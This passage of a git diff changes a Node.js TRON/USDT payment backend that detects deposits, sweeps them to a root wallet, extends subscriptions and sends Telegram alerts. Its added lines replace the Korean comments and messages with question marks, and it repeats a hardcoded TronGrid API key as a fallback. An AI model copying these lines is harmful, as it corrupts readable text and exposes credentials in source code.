-    console.log(`[TRX-CALC] 에너지 단가=${energyFee} sun → 필요 TRX=${trxNeeded}`);
+    const trxNeeded = Math.max(trxRaw + 2, 15); // +2 TRX bandwidth ??, ?? 15
+    console.log(`[TRX-CALC] ??? ??=${energyFee} sun ? ?? TRX=${trxNeeded}`);
     return trxNeeded;
   } catch (e) {
-    console.warn('[TRX-CALC] 체인 파라미터 조회 실패, fallback=28:', e.message);
+    console.warn('[TRX-CALC] ?? ???? ?? ??, fallback=28:', e.message);
     return 28;
   }
 }
 
-const TRX_CONFIRM_WAIT_MS = 20_000; // TRX 전송 후 대기 (ms)
+const TRX_CONFIRM_WAIT_MS = 20_000; // TRX ?? ? ?? (ms)
 
 async function autoSweepAndGrant(depositAddress, userId, managerId, usdtBalance) {
-  console.log(`[AUTO-SWEEP] 시작: addr=${depositAddress} user=${userId} usdt=${usdtBalance}`);
+  console.log(`[AUTO-SWEEP] ??: addr=${depositAddress} user=${userId} usdt=${usdtBalance}`);
   try {
-    // 1. 활성 지갑 조회
+    // 1. ?? ?? ??
     const activeWallet = await db.collectionWalletDB.getActive();
     if (!activeWallet?.xpub_key) {
-      console.warn('[AUTO-SWEEP] 활성 지갑/니모닉 없음 — 스킵'); return;
+      console.warn('[AUTO-SWEEP] ?? ??/??? ?? ? ??'); return;
     }
     const rootAddress = activeWallet.root_wallet_address;
 
-    // 2. 루트 / 입금주소 개인키 파생 (니모닉 필수 — xpub 불가)
+    // 2. ?? / ???? ??? ?? (??? ?? ? xpub ??)
     let rootPrivKey, depositPrivKey;
     try {
       rootPrivKey = deriveRootPrivateKey(activeWallet.xpub_key);
     } catch (e) {
-      console.error('[AUTO-SWEEP] ❌ 루트 개인키 파생 실패:', e.message);
-      console.error('[AUTO-SWEEP] ⚠️  관리자 페이지 > 지갑에서 xpub 대신 니모닉(12-24단어)으로 재등록 필요!');
+      console.error('[AUTO-SWEEP] ? ?? ??? ?? ??:', e.message);
+      console.error('[AUTO-SWEEP] ??  ??? ??? > ???? xpub ?? ???(12-24??)?? ??? ??!');
       return;
     }
     const [[addrRow]] = await db.pool.query(
       'SELECT derivation_index FROM deposit_addresses WHERE deposit_address = ?',
       [depositAddress]
     );
-    if (!addrRow) { console.warn('[AUTO-SWEEP] deposit_addresses 행 없음'); return; }
+    if (!addrRow) { console.warn('[AUTO-SWEEP] deposit_addresses ? ??'); return; }
     try {
       depositPrivKey = deriveTronPrivateKey(activeWallet.xpub_key, addrRow.derivation_index);
     } catch (e) {
-      console.error('[AUTO-SWEEP] ❌ 입금주소 개인키 파생 실패:', e.message);
+      console.error('[AUTO-SWEEP] ? ???? ??? ?? ??:', e.message);
       return;
     }
 
     const { TronWeb } = require('tronweb');
     const tronRoot = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey: rootPrivKey });
 
-    // ── 파생된 주소 vs DB 주소 일치 확인 ──
+    // ?? ??? ?? vs DB ?? ?? ?? ??
     const derivedRootAddr = tronRoot.defaultAddress.base58;
     if (derivedRootAddr !== rootAddress) {
-      console.error(`[AUTO-SWEEP] ❌ 루트 주소 불일치!`);
+      console.error(`[AUTO-SWEEP] ? ?? ?? ???!`);
       console.error(`  DB root_wallet_address : ${rootAddress}`);
-      console.error(`  니모닉 인덱스0 파생 주소 : ${derivedRootAddr}`);
-      console.error(`  → 관리자 페이지에서 root_wallet_address를 ${derivedRootAddr} 로 수정하거나 해당 주소의 니모닉을 재입력하세요.`);
+      console.error(`  ??? ???0 ?? ?? : ${derivedRootAddr}`);
+      console.error(`  ? ??? ????? root_wallet_address? ${derivedRootAddr} ? ????? ?? ??? ???? ??????.`);
       return;
     }
-    console.log(`[AUTO-SWEEP] ✅ 루트 주소 확인: ${rootAddress}`);
+    console.log(`[AUTO-SWEEP] ? ?? ?? ??: ${rootAddress}`);
 
     const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
 
-    // 2.5. 입금 주소 실제 USDT 잔액 확인 (TRX 선송금 전에 먼저 확인 → 낭비 방지)
+    // 2.5. ?? ?? ?? USDT ?? ?? (TRX ??? ?? ?? ?? ? ?? ??)
     let depositUsdtActual = 0;
     try {
       const depAcctResp = await axios.get(
@@ -680,16 +755,16 @@ async function autoSweepAndGrant(depositAddress, userId, managerId, usdtBalance)
       });
       depositUsdtActual = entry ? Number(Object.values(entry)[0]) / 1e6 : 0;
     } catch (e) {
-      console.warn('[AUTO-SWEEP] 입금주소 USDT 잔액 조회 실패:', e.message);
+      console.warn('[AUTO-SWEEP] ???? USDT ?? ?? ??:', e.message);
     }
     if (depositUsdtActual < 0.1) {
-      console.log(`[AUTO-SWEEP] 입금주소 실잔액 없음 (${depositUsdtActual.toFixed(4)} USDT) → swept 처리 후 종료`);
+      console.log(`[AUTO-SWEEP] ???? ??? ?? (${depositUsdtActual.toFixed(4)} USDT) ? swept ?? ? ??`);
       await db.depositAddressDB.updateStatus(depositAddress, 'swept');
       return;
     }
-    console.log(`[AUTO-SWEEP] 입금주소 실잔액 확인: ${depositUsdtActual.toFixed(4)} USDT`);
+    console.log(`[AUTO-SWEEP] ???? ??? ??: ${depositUsdtActual.toFixed(4)} USDT`);
 
-    // 3. 루트 지갑 TRX 잔액 확인 (TronGrid REST API 사용 — publicnode의 getBalance는 미활성 주소에서 에러 발생)
+    // 3. ?? ?? TRX ?? ?? (TronGrid REST API ?? ? publicnode? getBalance? ??? ???? ?? ??)
     let rootTrxBalance = 0;
     try {
       const balResp = await axios.get(
@@ -698,23 +773,23 @@ async function autoSweepAndGrant(depositAddress, userId, managerId, usdtBalance)
       );
       rootTrxBalance = (balResp.data?.data?.[0]?.balance || 0) / 1e6;
     } catch (e) {
-      console.error('[AUTO-SWEEP] TRX 잔액 조회 실패:', e.message);
+      console.error('[AUTO-SWEEP] TRX ?? ?? ??:', e.message);
       return;
     }
-    // 4. 필요한 TRX 동적 계산
+    // 4. ??? TRX ?? ??
     const trxNeeded = await calcTrxNeeded();
     if (rootTrxBalance < trxNeeded + 5) {
-      console.error(`[AUTO-SWEEP] 루트 지갑 TRX 부족: ${rootTrxBalance} TRX (필요 ${trxNeeded + 5})`);
+      console.error(`[AUTO-SWEEP] ?? ?? TRX ??: ${rootTrxBalance} TRX (?? ${trxNeeded + 5})`);
       return;
     }
 
-    // 4-b. 입금 주소로 TRX 선송금
-    console.log(`[AUTO-SWEEP] ${depositAddress}에 ${trxNeeded} TRX 전송 중... (계산값)`);
+    // 4-b. ?? ??? TRX ???
+    console.log(`[AUTO-SWEEP] ${depositAddress}? ${trxNeeded} TRX ?? ?... (???)`);
     const sendResult = await tronRoot.trx.sendTransaction(depositAddress, TronWeb.toSun(trxNeeded));
-    console.log(`[AUTO-SWEEP] TRX 전송 txID: ${sendResult?.txid || sendResult?.transaction?.txID || JSON.stringify(sendResult).slice(0,80)}`);
+    console.log(`[AUTO-SWEEP] TRX ?? txID: ${sendResult?.txid || sendResult?.transaction?.txID || JSON.stringify(sendResult).slice(0,80)}`);
 
-    // 5. TRX 실제 도착 확인 (최대 90초 = 6초 × 15회)
-    // — 단순 시간 대기 대신 잔액 폴링으로 안전하게 확인
+    // 5. TRX ?? ?? ?? (?? 90? = 6? ? 15?)
+    // ? ?? ?? ?? ?? ?? ???? ???? ??
     const TRX_CHECK_INTERVAL = 6000;
     const TRX_CHECK_MAX = 15;
     let trxConfirmed = false;
@@ -726,38 +801,38 @@ async function autoSweepAndGrant(depositAddress, userId, managerId, usdtBalance)
           { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 8000 }
         );
         const depTrxBal = (chkResp.data?.data?.[0]?.balance || 0) / 1e6;
-        console.log(`[AUTO-SWEEP] TRX 도착 확인 ${i + 1}/${TRX_CHECK_MAX}: ${depTrxBal} TRX`);
+        console.log(`[AUTO-SWEEP] TRX ?? ?? ${i + 1}/${TRX_CHECK_MAX}: ${depTrxBal} TRX`);
         if (depTrxBal >= 1) { trxConfirmed = true; break; }
-      } catch (_) { /* 일시적 오류 무시 */ }
+      } catch (_) { /* ??? ?? ?? */ }
     }
     if (!trxConfirmed) {
-      console.error('[AUTO-SWEEP] ❌ TRX 미착금 (90초 초과) — 다음 크론에서 재시도');
-      return; // paid 상태 유지 → 다음 크론에서 재시도
+      console.error('[AUTO-SWEEP] ? TRX ??? (90? ??) ? ?? ???? ???');
+      return; // paid ?? ?? ? ?? ???? ???
     }
 
-    // 6. 입금 주소로 USDT sweep
+    // 6. ?? ??? USDT sweep
     const tronDeposit = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey: depositPrivKey });
     const contract = await tronDeposit.contract().at(USDT_CONTRACT);
     const balanceRaw = await contract.balanceOf(depositAddress).call();
     const sweepAmount = Number(balanceRaw) / 1e6;
 
     if (sweepAmount < 0.1) {
-      console.warn(`[AUTO-SWEEP] USDT 부족: ${sweepAmount} — 스킵`); return;
+      console.warn(`[AUTO-SWEEP] USDT ??: ${sweepAmount} ? ??`); return;
     }
 
     const txId = await contract.transfer(rootAddress, Number(balanceRaw)).send({ feeLimit: 40_000_000 });
     await db.depositAddressDB.updateStatus(depositAddress, 'swept');
-    // txId가 객체/undefined/null 일 수 있으므로 항상 string으로 추출
+    // txId? ??/undefined/null ? ? ???? ?? string?? ??
     const txIdStr = String(txId?.txid || txId?.transaction?.txID || (typeof txId === 'string' ? txId : '') || 'unknown');
-    console.log(`[AUTO-SWEEP] ✅ 스윕 완료 ${sweepAmount} USDT → ${rootAddress} | txId=${txIdStr}`);
+    console.log(`[AUTO-SWEEP] ? ?? ?? ${sweepAmount} USDT ? ${rootAddress} | txId=${txIdStr}`);
 
-    // 7. 구독 일수 계산 & 연장
+    // 7. ?? ?? ?? & ??
     const days = await calcDaysFromUsdt(usdtBalance);
     const newExpiry = await db.userDB.extendSubscription(userId, days);
     const newExpiryDate = newExpiry instanceof Date ? newExpiry : new Date(newExpiry);
-    console.log(`[AUTO-SWEEP] ✅ 구독 ${days}일 연장 → user=${userId} 만료=${newExpiryDate.toISOString()}`);
+    console.log(`[AUTO-SWEEP] ? ?? ${days}? ?? ? user=${userId} ??=${newExpiryDate.toISOString()}`);
 
-    // 7-b. 총판 정산 자동 계산
+    // 7-b. ?? ?? ?? ??
     if (managerId) {
       try {
         const [[mgr]] = await db.pool.query('SELECT settlement_rate FROM managers WHERE id = ?', [managerId]);
@@ -773,71 +848,65 @@ async function autoSweepAndGrant(depositAddress, userId, managerId, usdtBalance)
              VALUES (?, ?, ?, ?, ?, ?)`,
             [managerId, userId, sweepAmount, rate, settlementAmount, paymentType]
           );
-          console.log(`[AUTO-SWEEP] ✅ 정산 적립 managerId=${managerId} rate=${rate}% amount=${settlementAmount.toFixed(4)} USDT`);
+          console.log(`[AUTO-SWEEP] ? ?? ?? managerId=${managerId} rate=${rate}% amount=${settlementAmount.toFixed(4)} USDT`);
         }
       } catch (e) {
-        console.error('[AUTO-SWEEP] 정산 계산 오류:', e.message);
+        console.error('[AUTO-SWEEP] ?? ?? ??:', e.message);
       }
     }
 
-    // 날짜를 locale 없이 안전하게 포맷 (서버 locale 무관)
+    // ??? locale ?? ???? ?? (?? locale ??)
     const expiryStr = `${newExpiryDate.getFullYear()}-${String(newExpiryDate.getMonth()+1).padStart(2,'0')}-${String(newExpiryDate.getDate()).padStart(2,'0')}`;
     const nowStr = new Date().toISOString().slice(0, 19).replace('T', ' ');
 
-    // 8. 텔레그램 알림 (매니저 + 마스터) — 입금 감지와 동일한 HTML 모드
+    // 8. ???? ?? (??? + ???) ? ?? ??? ??? HTML ??
     const msg =
-      `✅ <b>입금 처리 완료!</b>\n\n` +
-      `👤 유저: <code>${escapeHtml(userId)}</code>\n` +
-      `💵 금액: <b>${sweepAmount.toFixed(2)} USDT</b>\n` +
-      `📅 지급: <b>${days}일</b> (만료: ${escapeHtml(expiryStr)})\n` +
-      `🏦 수금: <code>${escapeHtml(rootAddress)}</code>\n` +
-      `🔗 TxID: <code>${escapeHtml(txIdStr.slice(0, 30))}</code>\n` +
-      `🕐 ${escapeHtml(nowStr)} UTC`;
+      `? <b>?? ?? ??!</b>\n\n` +
+      `?? ??: <code>${escapeHtml(userId)}</code>\n` +
+      `?? ??: <b>${sweepAmount.toFixed(2)} USDT</b>\n` +
+      `?? ??: <b>${days}?</b> (??: ${escapeHtml(expiryStr)})\n` +
+      `?? ??: <code>${escapeHtml(rootAddress)}</code>\n` +
+      `?? TxID: <code>${escapeHtml(txIdStr.slice(0, 30))}</code>\n` +
+      `?? ${escapeHtml(nowStr)} UTC`;
 
-    console.log(`[AUTO-SWEEP] 텔레그램 전송 시도 managerId=${managerId} masterChatId=${(await getMasterTelegram()).chatId}`);
+    console.log(`[AUTO-SWEEP] telegram managerId=${managerId}`);
 
     if (managerId) {
-      const [[mgr]] = await db.pool.query('SELECT tg_bot_token, tg_chat_id FROM managers WHERE id = ?', [managerId]);
-      if (mgr?.tg_bot_token && mgr?.tg_chat_id) {
-        console.log(`[AUTO-SWEEP] 매니저 봇 전송: chatId=${mgr.tg_chat_id}`);
-        await sendTelegram(mgr.tg_bot_token, mgr.tg_chat_id, msg);
-      }
+      await sendManagerTelegramByChannel(managerId, 'deposit', msg);
     }
-    const masterTg = await getMasterTelegram();
-    if (masterTg.botToken && masterTg.chatId) {
-      console.log(`[AUTO-SWEEP] 마스터 봇 전송: chatId=${masterTg.chatId}`);
-      await sendTelegram(masterTg.botToken, masterTg.chatId, msg);
-    } else {
-      console.warn('[AUTO-SWEEP] 마스터 봇 미설정 — 전송 스킵');
+    await sendMasterTelegramChannel('deposit', msg);
+    const _mc = await getMasterTgConfig();
+    if (!_mc.botToken || !_mc.chatDeposit) {
+      console.warn('[AUTO-SWEEP] master deposit telegram channel not configured');
     }
 
   } catch (e) {
-    console.error('[AUTO-SWEEP] 오류:', e.message || e);
+    console.error('[AUTO-SWEEP] ??:', e.message || e);
   }
 }
 
-// ---------- 벌크 결제 스윕 + 일괄 만료일 설정 ----------
+// ---------- ?? ?? ?? + ?? ??? ?? ----------
 async function autoSweepAndBulkGrant(session) {
-  console.log(`[BULK-SWEEP] 시작: id=${session.id} total=${session.total_usdt} USDT`);
+  console.log(`[BULK-SWEEP] ??: id=${session.id} total=${session.total_usdt} USDT`);
   try {
     const activeWallet = await db.collectionWalletDB.getActive();
-    if (!activeWallet?.xpub_key) { console.warn('[BULK-SWEEP] 활성 지갑/니모닉 없음'); return; }
+    if (!activeWallet?.xpub_key) { console.warn('[BULK-SWEEP] ?? ??/??? ??'); return; }
     const rootAddress = activeWallet.root_wallet_address;
 
     let rootPrivKey, depositPrivKey;
     try { rootPrivKey = deriveRootPrivateKey(activeWallet.xpub_key); }
-    catch (e) { console.error('[BULK-SWEEP] 루트키 파생 실패:', e.message); return; }
+    catch (e) { console.error('[BULK-SWEEP] ??? ?? ??:', e.message); return; }
     try { depositPrivKey = deriveTronPrivateKey(activeWallet.xpub_key, session.derivation_index); }
-    catch (e) { console.error('[BULK-SWEEP] 입금주소키 파생 실패:', e.message); return; }
+    catch (e) { console.error('[BULK-SWEEP] ????? ?? ??:', e.message); return; }
 
     const { TronWeb } = require('tronweb');
     const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
     const tronRoot = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey: rootPrivKey });
     if (tronRoot.defaultAddress.base58 !== rootAddress) {
-      console.error('[BULK-SWEEP] 루트 주소 불일치'); return;
+      console.error('[BULK-SWEEP] ?? ?? ???'); return;
     }
 
-    // 실잔액 확인
+    // ??? ??
     let depositUsdt = 0;
     try {
       const r = await axios.get(`https://api.trongrid.io/v1/accounts/${session.deposit_address}`,
@@ -851,7 +920,7 @@ async function autoSweepAndBulkGrant(session) {
       return;
     }
 
-    // TRX 가스비 송금 (기존과 동일)
+    // TRX ??? ?? (??? ??)
     let rootTrxBal = 0;
     try {
       const r = await axios.get(`https://api.trongrid.io/v1/accounts/${rootAddress}`,
@@ -860,9 +929,9 @@ async function autoSweepAndBulkGrant(session) {
     } catch (_) {}
     if (rootTrxBal >= 2) {
       await tronRoot.trx.sendTransaction(session.deposit_address, Math.floor(2 * 1e6));
-      console.log(`[BULK-SWEEP] TRX 2개 → ${session.deposit_address}`);
+      console.log(`[BULK-SWEEP] TRX 2? ? ${session.deposit_address}`);
     }
-    // TRX 도착 대기 (최대 90초)
+    // TRX ?? ?? (?? 90?)
     const TRX_CHECK_MAX = 9; const TRX_CHECK_INTERVAL = 10000;
     for (let i = 0; i < TRX_CHECK_MAX; i++) {
       await new Promise(r => setTimeout(r, TRX_CHECK_INTERVAL));
@@ -880,9 +949,9 @@ async function autoSweepAndBulkGrant(session) {
     const sweepAmt = Number(balRaw) / 1e6;
     if (sweepAmt < 0.1) { await db.pool.query(`UPDATE bulk_payment_sessions SET status='complete' WHERE id=?`, [session.id]); return; }
     await contract.transfer(rootAddress, Number(balRaw)).send({ feeLimit: 40_000_000 });
-    console.log(`[BULK-SWEEP] ✅ ${sweepAmt} USDT → ${rootAddress}`);
+    console.log(`[BULK-SWEEP] ? ${sweepAmt} USDT ? ${rootAddress}`);
 
-    // 일괄 만료일 설정
+    // ?? ??? ??
     const entries = JSON.parse(session.entries || '[]');
     const targetDate = session.target_date instanceof Date
       ? session.target_date
@@ -894,44 +963,42 @@ async function autoSweepAndBulkGrant(session) {
         `UPDATE users SET expire_date = ?, status = 'approved' WHERE id = ?`,
         [tgtStr, e.userId.toLowerCase()]
       );
-      console.log(`[BULK-SWEEP] ✅ ${e.userId} 만료일 → ${tgtStr}`);
+      console.log(`[BULK-SWEEP] ? ${e.userId} ??? ? ${tgtStr}`);
     }
 
     await db.pool.query(`UPDATE bulk_payment_sessions SET status='complete' WHERE id=?`, [session.id]);
-    console.log(`[BULK-SWEEP] ✅ 완료 id=${session.id}`);
+    console.log(`[BULK-SWEEP] ? ?? id=${session.id}`);
 
-    // 텔레그램 알림 (마스터)
     try {
-      const masterTg = await getMasterTelegram();
-      if (masterTg.botToken && masterTg.chatId) {
-        const userList = entries.filter(e => e.days > 0).map(e => `<code>${escapeHtml(String(e.userId))}</code>`).join(', ');
-        await sendTelegram(masterTg.botToken, masterTg.chatId,
-          `✅ <b>벌크 입금 처리 완료!</b>\n💵 ${sweepAmt.toFixed(2)} USDT\n📅 만료일 → ${tgtStr}\n👥 ${userList}`);
-      }
+      const userList = entries.filter(e => e.days > 0).map(e => `<code>${escapeHtml(String(e.userId))}</code>`).join(', ');
+      await sendMasterTelegramChannel(
+        'deposit',
+        `? <b>Bulk deposit processed</b>\n?? ${sweepAmt.toFixed(2)} USDT\n?? ${tgtStr}\n?? ${userList}`
+      );
     } catch (_) {}
   } catch (e) {
-    console.error('[BULK-SWEEP] 오류:', e.message);
+    console.error('[BULK-SWEEP] ??:', e.message);
   }
 }
 
-// ---------- 입금 감지 크론잡 ----------
-// TronGrid 무료 쿼터: 100,000건/일 → 안전 예산 90,000건
-// 1,440분/일 → 분당 최대 62건 처리 (90,000 / 1,440 = 62.5)
-// 150ms 딜레이 × 62건 ≈ 9.3초/분 실행 → 1분 이내 완료
+// ---------- ?? ?? ??? ----------
+// TronGrid ?? ??: 100,000?/? ? ?? ?? 90,000?
+// 1,440?/? ? ?? ?? 62? ?? (90,000 / 1,440 = 62.5)
+// 150ms ??? ? 62? ? 9.3?/? ?? ? 1? ?? ??
 const TRONGRID_DAILY_BUDGET = Number(process.env.TRONGRID_DAILY_BUDGET) || 90000;
 const CRON_MINUTES_PER_DAY = 1440;
 const PER_RUN_LIMIT = Math.floor(TRONGRID_DAILY_BUDGET / CRON_MINUTES_PER_DAY); // 62
-const REQUEST_DELAY_MS = 150; // 초당 ~6건, TronGrid 초당 한도(15건) 이내
+const REQUEST_DELAY_MS = 150; // ?? ~6?, TronGrid ?? ??(15?) ??
 
-const ADDRESS_EXPIRE_HOURS = 1; // 입금 없는 주소 만료 시간
+const ADDRESS_EXPIRE_HOURS = 1; // ?? ?? ?? ?? ??
 
 let _depositCheckRunning = false;
 
 cron.schedule('* * * * *', async () => {
-  if (_depositCheckRunning) return; // 이전 실행이 아직 끝나지 않은 경우 skip
+  if (_depositCheckRunning) return; // ?? ??? ?? ??? ?? ?? skip
   _depositCheckRunning = true;
   try {
-    // ── 1시간 초과 미결제 주소 만료 처리 ──
+    // ?? 1?? ?? ??? ?? ?? ?? ??
     const [expireResult] = await db.pool.query(
       `UPDATE deposit_addresses
           SET status = 'expired'
@@ -940,7 +1007,7 @@ cron.schedule('* * * * *', async () => {
       [ADDRESS_EXPIRE_HOURS]
     );
     if (expireResult.affectedRows > 0) {
-      console.log(`[DEPOSIT-CHECK] ⏰ 만료 처리: ${expireResult.affectedRows}개 주소 → expired`);
+      console.log(`[DEPOSIT-CHECK] ? ?? ??: ${expireResult.affectedRows}? ?? ? expired`);
     }
 
     const [addresses] = await db.pool.query(
@@ -954,17 +1021,14 @@ cron.schedule('* * * * *', async () => {
     );
     if (addresses.length === 0) return;
 
-    console.log(`[DEPOSIT-CHECK] 이번 분 처리: ${addresses.length}개 (한도 ${PER_RUN_LIMIT}/분, 예산 ${TRONGRID_DAILY_BUDGET}/일)`);
+    console.log(`[DEPOSIT-CHECK] ?? ? ??: ${addresses.length}? (?? ${PER_RUN_LIMIT}/?, ?? ${TRONGRID_DAILY_BUDGET}/?)`);
 
     const tronGridHeaders = { 'TRON-PRO-API-KEY': process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb' };
 
-    // 마스터 알림봇은 크론 실행당 한 번만 조회
-    const masterTg = await getMasterTelegram();
-
     for (const addr of addresses) {
       try {
-        // /v1/accounts/{addr}/transactions/trc20 로 USDT 입금 이력 직접 확인
-        // (account 엔드포인트의 trc20 필드가 누락되는 경우가 있어 더 신뢰성 높음)
+        // /v1/accounts/{addr}/transactions/trc20 ? USDT ?? ?? ?? ??
+        // (account ?????? trc20 ??? ???? ??? ?? ? ??? ??)
         const txResp = await axios.get(
           `https://api.trongrid.io/v1/accounts/${addr.deposit_address}/transactions/trc20`,
           {
@@ -976,7 +1040,7 @@ cron.schedule('* * * * *', async () => {
 
         const txList = txResp.data?.data || [];
 
-        // ── 실제 현재 USDT 잔액 조회 (거래 내역 합산 방식은 스윕 후에도 양수로 남아 무한루프 발생) ──
+        // ?? ?? ?? USDT ?? ?? (?? ?? ?? ??? ?? ??? ??? ?? ???? ??) ??
         let actualUsdtBalance = 0;
         try {
           const acctResp = await axios.get(
@@ -990,10 +1054,10 @@ cron.schedule('* * * * *', async () => {
           });
           actualUsdtBalance = usdtEntry ? Number(Object.values(usdtEntry)[0]) / 1e6 : 0;
         } catch (e) {
-          console.warn(`[DEPOSIT-CHECK] 실잔액 조회 실패 (${addr.deposit_address}):`, e.message);
+          console.warn(`[DEPOSIT-CHECK] ??? ?? ?? (${addr.deposit_address}):`, e.message);
         }
 
-        // 실잔액 0 + 트랜잭션 없음 → 미입금 상태로 전환
+        // ??? 0 + ???? ?? ? ??? ??? ??
         if (txList.length === 0 && actualUsdtBalance < 0.01) {
           await db.pool.query(
             `UPDATE deposit_addresses SET status = 'waiting_deposit'
@@ -1004,9 +1068,9 @@ cron.schedule('* * * * *', async () => {
           continue;
         }
 
-        // 실잔액 0이지만 트랜잭션 기록이 남아 있는 경우 → 이미 스윕됨, DB 정리
+        // ??? 0??? ???? ??? ?? ?? ?? ? ?? ???, DB ??
         if (actualUsdtBalance < 0.01 && addr.status === 'paid') {
-          console.log(`[DEPOSIT-CHECK] 주소 ${addr.deposit_address} 실잔액 0 (이미 스윕 완료) → swept 처리`);
+          console.log(`[DEPOSIT-CHECK] ?? ${addr.deposit_address} ??? 0 (?? ?? ??) ? swept ??`);
           await db.depositAddressDB.updateStatus(addr.deposit_address, 'swept');
           await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
           continue;
@@ -1020,58 +1084,50 @@ cron.schedule('* * * * *', async () => {
           const alreadyPaid = addr.status === 'paid';
 
           if (!alreadyPaid) {
-            // 최초 감지 → 상태 변경 + 텔레그램 알림
+            // ?? ?? ? ?? ?? + ???? ??
             await db.depositAddressDB.updateStatus(addr.deposit_address, 'paid');
-            console.log(`[DEPOSIT-CHECK] ✅ 입금 확인 userId=${addr.user_id} ${usdtBalance} USDT`);
+            console.log(`[DEPOSIT-CHECK] ? ?? ?? userId=${addr.user_id} ${usdtBalance} USDT`);
 
             const msg =
-              `💰 <b>입금 감지!</b>\n\n` +
-              `👤 유저: <code>${escapeHtml(addr.user_id)}</code>\n` +
-              (addr.manager_id ? `🧑‍💼 매니저: <code>${escapeHtml(addr.manager_id)}</code>\n` : '') +
-              `💵 금액: <b>${usdtBalance.toFixed(2)} USDT</b>\n` +
-              `📬 주소: <code>${escapeHtml(addr.deposit_address)}</code>\n` +
-              `🕐 시각: ${escapeHtml(new Date().toLocaleString('ko-KR'))}`;
+              `?? <b>?? ??!</b>\n\n` +
+              `?? ??: <code>${escapeHtml(addr.user_id)}</code>\n` +
+              (addr.manager_id ? `????? ???: <code>${escapeHtml(addr.manager_id)}</code>\n` : '') +
+              `?? ??: <b>${usdtBalance.toFixed(2)} USDT</b>\n` +
+              `?? ??: <code>${escapeHtml(addr.deposit_address)}</code>\n` +
+              `?? ??: ${escapeHtml(new Date().toLocaleString('ko-KR'))}`;
 
             if (addr.manager_id) {
-              const [[mgr]] = await db.pool.query(
-                'SELECT tg_bot_token, tg_chat_id FROM managers WHERE id = ?',
-                [addr.manager_id]
-              );
-              if (mgr?.tg_bot_token && mgr?.tg_chat_id) {
-                await sendTelegram(mgr.tg_bot_token, mgr.tg_chat_id, msg);
-              }
+              await sendManagerTelegramByChannel(addr.manager_id, 'deposit', msg);
             }
-            if (masterTg.botToken && masterTg.chatId) {
-              await sendTelegram(masterTg.botToken, masterTg.chatId, msg);
-            }
+            await sendMasterTelegramChannel('deposit', msg);
           } else {
-            // 이미 paid — 스윕 재시도 중
-            console.log(`[DEPOSIT-CHECK] 🔄 스윕 재시도 userId=${addr.user_id} ${usdtBalance} USDT`);
+            // ?? paid ? ?? ??? ?
+            console.log(`[DEPOSIT-CHECK] ?? ?? ??? userId=${addr.user_id} ${usdtBalance} USDT`);
           }
 
-          // 자동 스윕 & 구독 부여 (fire-and-forget, 스윕 실패 시 다음 크론에 재시도)
+          // ?? ?? & ?? ?? (fire-and-forget, ?? ?? ? ?? ??? ???)
           autoSweepAndGrant(addr.deposit_address, addr.user_id, addr.manager_id, usdtBalance)
-            .catch(e => console.error('[AUTO-SWEEP] 예외:', e.message));
+            .catch(e => console.error('[AUTO-SWEEP] ??:', e.message));
         }
       } catch (e) {
-        console.error(`[DEPOSIT-CHECK] ${addr.deposit_address} 오류:`, e.message);
+        console.error(`[DEPOSIT-CHECK] ${addr.deposit_address} ??:`, e.message);
       }
       await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
     }
-    // ── 벌크 결제 세션 체크 ──
+    // ?? ?? ?? ?? ?? ??
     try {
-      // 1시간 초과 pending 세션 만료
+      // 1?? ?? pending ?? ??
       await db.pool.query(
         `UPDATE bulk_payment_sessions SET status='expired'
          WHERE status='pending' AND created_at < DATE_SUB(NOW(), INTERVAL 1 HOUR)`
       );
-      // pending 세션 목록 (최대 10개)
+      // pending ?? ?? (?? 10?)
       const [bulkList] = await db.pool.query(
         `SELECT * FROM bulk_payment_sessions WHERE status='pending' AND deposit_address IS NOT NULL LIMIT 10`
       );
       for (const sess of bulkList) {
         try {
-          // TronGrid로 입금 주소 USDT 잔액 확인
+          // TronGrid? ?? ?? USDT ?? ??
           const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
           const resp = await axios.get(
             `https://api.trongrid.io/v1/accounts/${sess.deposit_address}`,
@@ -1083,31 +1139,31 @@ cron.schedule('* * * * *', async () => {
             return k && k.toLowerCase() === USDT_CONTRACT.toLowerCase();
           });
           const bal = entry ? Number(Object.values(entry)[0]) / 1e6 : 0;
-          if (bal >= Number(sess.total_usdt) * 0.98) { // 2% 오차 허용
-            console.log(`[BULK-SWEEP] 입금 감지 token=${sess.id} bal=${bal} required=${sess.total_usdt}`);
+          if (bal >= Number(sess.total_usdt) * 0.98) { // 2% ?? ??
+            console.log(`[BULK-SWEEP] ?? ?? token=${sess.id} bal=${bal} required=${sess.total_usdt}`);
             await db.pool.query(`UPDATE bulk_payment_sessions SET status='paid' WHERE id=?`, [sess.id]);
-            autoSweepAndBulkGrant(sess).catch(e => console.error('[BULK-SWEEP] 오류:', e.message));
+            autoSweepAndBulkGrant(sess).catch(e => console.error('[BULK-SWEEP] ??:', e.message));
           }
-        } catch (e) { console.warn(`[BULK-CHECK] ${sess.id} 오류:`, e.message); }
+        } catch (e) { console.warn(`[BULK-CHECK] ${sess.id} ??:`, e.message); }
         await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
       }
-    } catch (e) { console.error('[BULK-CHECK] 크론 오류:', e.message); }
+    } catch (e) { console.error('[BULK-CHECK] ?? ??:', e.message); }
   } catch (e) {
-    console.error('[DEPOSIT-CHECK] 크론잡 오류:', e.message);
+    console.error('[DEPOSIT-CHECK] ??? ??:', e.message);
   } finally {
     _depositCheckRunning = false;
   }
 });
 
-// ---------- 클라이언트용 세션 저장소 (DB 기반) ----------
-// 슬라이딩 세션: 검증할 때마다 만료 시간 연장 (기본 24시간)
-const SESSION_TIMEOUT = 24 * 60 * 60 * 1000; // 24시간 (밀리초)
+// ---------- ?????? ?? ??? (DB ??) ----------
+// ???? ??: ??? ??? ?? ?? ?? (?? 24??)
+const SESSION_TIMEOUT = 24 * 60 * 60 * 1000; // 24?? (???)
 
 const sessionStore = {
-  // DB 기반 세션 저장
+  // DB ?? ?? ??
